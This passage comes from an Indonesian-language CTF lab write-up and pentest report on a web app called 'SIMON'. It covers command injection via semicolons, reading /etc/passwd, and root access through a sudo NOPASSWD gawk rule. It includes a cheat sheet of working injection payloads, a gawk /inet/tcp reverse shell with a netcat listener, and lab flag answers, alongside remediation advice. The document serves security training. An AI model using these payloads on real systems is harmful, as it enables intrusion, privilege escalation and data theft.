> `escapeshellarg()` hanya defense-in-depth. Solusi utama adalah tidak membangun shell command dari input pengguna.

---

## 3. Temuan 2 — Informasi Sensitif Dapat Diakses melalui Command Injection

### Deskripsi

Command injection dapat digunakan untuk membaca `/etc/passwd`, enumerasi user, dan mengakses:

```text
/home/monitor/flag.txt
```

### Evidence

```text
monitor:x:1000:1000::/home/monitor:/bin/bash
```

```text
FLAG{cmd_1nj3ct_subst_4b1c8f2e}
```

### Dampak

Walaupun `/etc/passwd` tidak menyimpan hash password modern, file tersebut membantu attacker:

- mengenali user valid;
- menemukan home directory;
- menentukan shell login;
- menyiapkan serangan lanjutan;
- mencari file credential dan SSH key.

### Rekomendasi

- Terapkan least privilege pada service account.
- Jangan menyimpan secret di home directory yang dapat dibaca service web.
- Batasi permission file.
- Gunakan secret manager.
- Hindari credential plaintext pada source code dan `.env`.
- Audit file yang dapat dibaca `www-data`.

---

## 4. Temuan 3 — `www-data` Dapat Menjalankan `gawk` sebagai Root tanpa Password

### Deskripsi

Sudoers mengizinkan:

```text
(root) NOPASSWD: /usr/bin/gawk
```

`gawk` bukan utility aman untuk diberikan melalui sudo karena dapat menjalankan command dengan `system()` dan membuat koneksi TCP.

### Evidence

```text
sudo -l
→ (root) NOPASSWD: /usr/bin/gawk
```

Validasi:

```text
sudo /usr/bin/gawk 'BEGIN {system("id")}'
→ uid=0(root)
```

### Dampak

Setiap attacker yang memperoleh command execution sebagai `www-data` dapat langsung memperoleh root pada container.

### Rekomendasi

Hapus rule tersebut dari sudoers:

```text
www-data ALL=(root) NOPASSWD: /usr/bin/gawk
```

Periksa konfigurasi:

```bash
visudo
grep -Rni 'gawk\|www-data' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

Apabila aplikasi benar-benar membutuhkan fungsi tertentu:

- buat wrapper root-owned dengan command dan argument yang fixed;
- jangan menerima input bebas;
- gunakan allowlist;
- berikan privilege minimum;
- jalankan melalui service/API khusus, bukan general-purpose interpreter;
- log seluruh pemanggilan privileged action.

---

## 5. Temuan 4 — Root Berpotensi Terbatas pada Container

### Deskripsi

Hostname seperti:

```text
4f568867824c
```

mengindikasikan bahwa aplikasi kemungkinan berjalan di dalam container.

### Dampak

Root dalam container memberikan kontrol penuh atas:

- filesystem container;
- proses di dalam container;
- environment variable;
- aplikasi dan data yang di-mount;
- credential service yang tersedia.

Namun, hal tersebut tidak otomatis membuktikan root pada host.

### Rekomendasi Container

- Jalankan container sebagai non-root.
- Gunakan `USER` non-root pada Dockerfile.
- Hapus `sudo` dari image produksi.
- Gunakan read-only root filesystem.
- Drop seluruh capability yang tidak diperlukan.
- Terapkan seccomp, AppArmor, atau SELinux.
- Jangan mount `/var/run/docker.sock`.
- Jangan gunakan `--privileged`.
- Hindari host filesystem mount writable.
- Pisahkan secret dari image dan environment yang mudah dibaca.
- Gunakan image minimal dan lakukan patching rutin.

---

## 6. Severity dan Rantai Dampak

| Temuan | Dampak | Severity Indikatif |
|---|---|---|
| OS Command Injection | RCE sebagai `www-data` | Critical |
| Pembacaan file lokal | Kebocoran data dan credential | High |
| Sudo NOPASSWD `gawk` | Root pada container | Critical |
| Hardening container tidak memadai | Potensi eskalasi scope | Tergantung konfigurasi |

Severity final harus mempertimbangkan:

- autentikasi yang diperlukan;
- exposure jaringan;
- data pada container;
- volume atau secret yang di-mount;
- kemungkinan akses terhadap host atau service lain.

---

## 7. Rekomendasi Prioritas

### Prioritas 1 — Hentikan Command Injection

1. Nonaktifkan sementara fitur rentan.
2. Hapus penggunaan shell command dengan input pengguna.
3. Migrasikan fungsi pemeriksaan ke library HTTP native.
4. Terapkan allowlist tujuan.

### Prioritas 2 — Cabut Sudo Rule

1. Hapus `NOPASSWD /usr/bin/gawk`.
2. Audit seluruh `/etc/sudoers.d`.
3. Pastikan `www-data` tidak memiliki command sudo lain.
4. Hapus package `sudo` dari container apabila tidak dibutuhkan.

### Prioritas 3 — Rotasi Secret

Karena attacker dapat membaca file:

1. rotasi database credential;
2. rotasi API key dan token;
3. rotasi password service account;
4. periksa SSH key;
5. periksa environment variable container.

### Prioritas 4 — Investigasi dan Monitoring

Cari indikator:

```text
; cat /etc/passwd
; id
; sudo -l
sudo /usr/bin/gawk
/inet/tcp/0/
```

Tinjau:

- access log aplikasi;
- reverse proxy log;
- audit log sudo;
- container runtime log;
- koneksi outbound dari container;
- perubahan file aplikasi.

---

## 8. Checklist Evidence untuk Laporan

| Tahap | Evidence yang Dicatat |
|---|---|
| Host discovery | `192.168.56.12` aktif |
| Service scan | Port `80` dan `8347` |
| Service version | Apache `2.4.67` Debian |
| Runtime | PHP `8.2.31` |
| Redirect | `302 Location: /monitor/` |
| Aplikasi | SIMON Perkakas Internal v1.8 |
| Command injection | `8.8.8.8; cat /etc/passwd` |
| Initial context | UID 33 `www-data` |
| User lokal | `monitor`, home `/home/monitor` |
| User flag | `/home/monitor/flag.txt` |
| Sudo enumeration | `NOPASSWD /usr/bin/gawk` |
| Root proof | `id` menghasilkan UID 0 |
| Container indicator | Hostname mirip container ID |
| Root flag | `/root/flag.txt` dan `FLAG{r00t_sud0_gawk_9a7d3c50}` |

---

## 9. Ringkasan Temuan Siap Laporan

```text
Aplikasi SIMON Perkakas Internal pada 192.168.56.12:8347 memiliki kerentanan
OS Command Injection pada fitur Cek Status Layanan. Input alamat target diteruskan
ke command sistem operasi tanpa validasi yang memadai. Dengan menambahkan karakter
titik koma, penguji berhasil menjalankan command tambahan, membaca /etc/passwd,
dan mengeksekusi command sebagai account service www-data.

Dari hasil enumerasi, account www-data diizinkan menjalankan /usr/bin/gawk sebagai
root melalui sudo tanpa password. Binary gawk memiliki fungsi system() dan dukungan
koneksi TCP yang dapat digunakan untuk menjalankan command atau membuka reverse
shell. Salah konfigurasi tersebut memungkinkan privilege escalation dari www-data
menjadi root pada lingkungan container aplikasi.

Rantai kerentanan memungkinkan attacker menjalankan command arbitrer, membaca data
user lokal, memperoleh user flag, dan menjalankan command sebagai root langsung dari
form web. Melalui `sudo gawk`, penguji menemukan `/root/flag.txt` dan membaca
`FLAG{r00t_sud0_gawk_9a7d3c50}` tanpa membutuhkan reverse shell. Ruang lingkup terhadap
host tetap harus diverifikasi terpisah karena hostname target mengindikasikan
lingkungan container.
```

---

# Bagian C — Close Book dan Cheat Sheet

> Gunakan bagian ini setelah memahami Bagian A. Jalur tercepat adalah menjalankan `gawk system()` langsung melalui form web sampai root flag tampil.

---

## 1. Set Variabel

```bash
NETWORK="192.168.56.0/24"
TARGET="192.168.56.12"
BASE="http://192.168.56.12:8347"
APP="http://192.168.56.12:8347/monitor/"
WINDOWS_IP="192.168.56.1"
WSL_IP="172.26.59.55"
LPORT="12345"
```

---

## 2. Recon

```bash
nmap -sn "$NETWORK"
nmap -sC -sV -p- "$TARGET"
curl -i "$BASE"
```

Expected:

```text
80/tcp   open  http  Apache 2.4.67
8347/tcp open  http  Apache 2.4.67
Location: /monitor/
X-Powered-By: PHP/8.2.31
```

---

## 3. Command Injection melalui Browser

Buka:

```text
http://192.168.56.12:8347/monitor/
```

Uji:

```text
8.8.8.8; cat /etc/passwd
```

Validasi user:

```text
8.8.8.8; id
```

Expected:

```text
uid=33(www-data) gid=33(www-data)
```

---

## 4. User Flag

```text
8.8.8.8; ls /home/monitor
```

```text
8.8.8.8; cat /home/monitor/flag.txt
```

Expected:

```text
FLAG{cmd_1nj3ct_subst_4b1c8f2e}
```

---

## 5. Enumerasi Sudo

```text
8.8.8.8; sudo -l
```

Expected:

```text
(root) NOPASSWD: /usr/bin/gawk
```

---

## 6. Opsi Utama — Root dan Flag Langsung melalui Web

```text
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("id")}'
```

Expected:

```text
uid=0(root)
```

Cari flag:

```text
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("find / -type f -name flag.txt 2>/dev/null")}'
```

Baca path yang ditemukan:

```text
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("cat /root/flag.txt")}'
```

Expected:

```text
FLAG{r00t_sud0_gawk_9a7d3c50}
```

---

## 7. Opsi Tambahan — Root Reverse Shell

### PowerShell Administrator untuk WSL

```powershell
netsh interface portproxy add v4tov4 `
  listenaddress=0.0.0.0 `
  listenport=12345 `
  connectaddress=172.26.59.55 `
  connectport=12345

New-NetFirewallRule `
  -DisplayName "SIMON WSL Listener 12345" `
  -Direction Inbound `
  -Action Allow `
  -Protocol TCP `
  -LocalPort 12345 `
  -RemoteAddress 192.168.56.0/24
```

### Listener WSL

```bash
nc -lvnp 12345
```

### Payload di SIMON

```text
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {s="/inet/tcp/0/192.168.56.1/12345";while(1){printf "> " |& s;if((s |& getline c)<=0)break;while(c&&(c |& getline)>0)print $0 |& s;close(c)}}'
```

### Setelah Koneksi Masuk

```bash
id
whoami
find / -type f -name "flag.txt" 2>/dev/null
cat <PATH_ROOT_FLAG>
```

---

## 8. Pengujian Opsional dengan Curl

Nama parameter form tidak terlihat pada capture. Identifikasi terlebih dahulu menggunakan Burp Suite atau browser DevTools.

Misalnya request menggunakan parameter `target`, command dapat dikirim dengan:

```bash
PARAM="target"

curl -s -X POST "$APP" \
  --data-urlencode "${PARAM}=8.8.8.8; id"
```

Jangan menganggap nama parameter pasti `target`. Gunakan nama parameter aktual dari HTTP request.

---

## 9. Cheat Sheet Paling Pendek

```text
nmap -sC -sV -p- 192.168.56.12
http://192.168.56.12:8347/monitor/

8.8.8.8; cat /etc/passwd
8.8.8.8; id
8.8.8.8; ls /home/monitor
8.8.8.8; cat /home/monitor/flag.txt
8.8.8.8; sudo -l
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("id")}'
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("find / -type f -name flag.txt 2>/dev/null")}'
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("cat /root/flag.txt")}'
```

---

# Alur Hafalan Akhir

```text
SCAN
→ 8347 /monitor/
→ SEMICOLON
→ PASSWD
→ WWW-DATA
→ USER FLAG
→ SUDO -L
→ GAWK VIA WEB
→ UID 0
→ FIND /root/flag.txt
→ CAT ROOT FLAG
```

## Mnemonic

```text
S.M.I.L.E.R.

S = Scan target
M = Monitor path
I = Inject semicolon
L = Local user flag
E = Enumerate sudo
R = Root through gawk
```

---

## Penutup

Lab SIMON menunjukkan bahwa fungsi sederhana seperti pemeriksaan status URL dapat menjadi titik kompromi penuh apabila input diteruskan ke shell. Initial command execution sebagai `www-data` seharusnya dibatasi oleh privilege sistem. Namun, rule `sudo` terhadap `gawk` menghilangkan batas tersebut dan memungkinkan root command execution.

Dua perbaikan yang paling mendesak adalah:

```text
1. Hapus penggunaan shell command dari fitur Cek Status Layanan.
2. Hapus rule NOPASSWD /usr/bin/gawk untuk www-data.
```
